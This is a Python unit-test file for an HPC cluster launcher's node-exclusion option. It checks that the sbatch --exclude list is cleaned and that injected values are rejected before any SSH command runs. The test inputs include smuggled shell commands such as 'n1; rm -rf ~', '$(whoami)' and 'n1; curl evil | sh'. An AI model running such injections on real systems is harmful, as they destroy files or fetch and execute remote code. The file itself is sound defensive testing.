#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for the VSCode panel's "Exclude Nodes" option (``sbatch --exclude``).

The exclusion list is interpolated into a shell command run on the login node, so
the tests that matter most are the ones showing a hostile or malformed value can
never reach that command.
"""

import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                "hpc3_launcher"))

from modules.vscode_helper import (  # noqa: E402
    VSCodeManager, clean_exclude_list, parse_sinfo_nodes,
)


class TestCleanExcludeList(unittest.TestCase):
    def test_empty(self):
        self.assertEqual(clean_exclude_list(None), [])
        self.assertEqual(clean_exclude_list([]), [])

    def test_keeps_order_and_drops_duplicates(self):
        self.assertEqual(
            clean_exclude_list(["hpc3-gpu-n54-01", "hpc3-gpu-m54-01", "hpc3-gpu-n54-01"]),
            ["hpc3-gpu-n54-01", "hpc3-gpu-m54-01"])

    def test_rejects_rather_than_drops(self):
        for bad in ["n1; rm -rf ~", "n1 n2", "n1,n2", "$(whoami)", "`id`", "", "None", "n1\nn2"]:
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    clean_exclude_list(["hpc3-gpu-n54-01", bad])


class TestParseSinfoNodes(unittest.TestCase):
    def test_groups_by_partition(self):
        out = ("hpc3-gpu-n54-01|gpu32|mixed\n"
               "hpc3-gpu-n54-01|free-gpu32|mixed\n"
               "hpc3-gpu-m54-01|gpu32|draining\n"
               "hpc3-14-00|standard*|idle\n")
        self.assertEqual(parse_sinfo_nodes(out), {
            "gpu32": [("hpc3-gpu-n54-01", "mixed"), ("hpc3-gpu-m54-01", "draining")],
            "free-gpu32": [("hpc3-gpu-n54-01", "mixed")],
            "standard": [("hpc3-14-00", "idle")],   # default-partition "*" stripped
        })

    def test_ignores_junk(self):
        self.assertEqual(parse_sinfo_nodes(""), {})
        self.assertEqual(parse_sinfo_nodes(None), {})
        self.assertEqual(parse_sinfo_nodes("sinfo: error\nbad node|gpu|idle\nn1|gpu\n"), {})


class TestSubmitCommand(unittest.TestCase):
    def _submit(self, **kwargs):
        """Run submit_vscode_job with SSH stubbed out; return the sbatch command."""
        manager = VSCodeManager(hostname="hpc3.rcic.uci.edu", username="jinx19",
                                key_path="/nonexistent")
        commands = []

        def fake_exec(cmd):
            commands.append(cmd)
            return "Submitted batch job 12345\n"

        with mock.patch.object(manager, "connect_ssh", return_value=True), \
                mock.patch.object(manager, "execute_ssh_command", side_effect=fake_exec), \
                mock.patch.object(manager, "_start_poll_job_status"):
            manager.submit_vscode_job(account="LAB_GPU32", gpu_type="RTX6000", **kwargs)
        return commands

    def test_no_exclusions_no_flag(self):
        (cmd,) = self._submit()
        self.assertNotIn("--exclude", cmd)

    def test_exclusions_become_one_flag(self):
        (cmd,) = self._submit(exclude_nodes=["hpc3-gpu-n54-01", "hpc3-gpu-m54-01"])
        self.assertIn(" --exclude=hpc3-gpu-n54-01,hpc3-gpu-m54-01 ", cmd)
        self.assertTrue(cmd.endswith(" /opt/rcic/scripts/vscode-sshd.sh"))

    def test_bad_node_never_reaches_the_shell(self):
        manager = VSCodeManager(hostname="hpc3.rcic.uci.edu", username="jinx19",
                                key_path="/nonexistent")
        with mock.patch.object(manager, "connect_ssh") as connect, \
                mock.patch.object(manager, "execute_ssh_command") as execute:
            with self.assertRaises(ValueError):
                manager.submit_vscode_job(account="LAB_GPU32",
                                          exclude_nodes=["n1; curl evil | sh"])
        connect.assert_not_called()
        execute.assert_not_called()


if __name__ == "__main__":
    unittest.main()
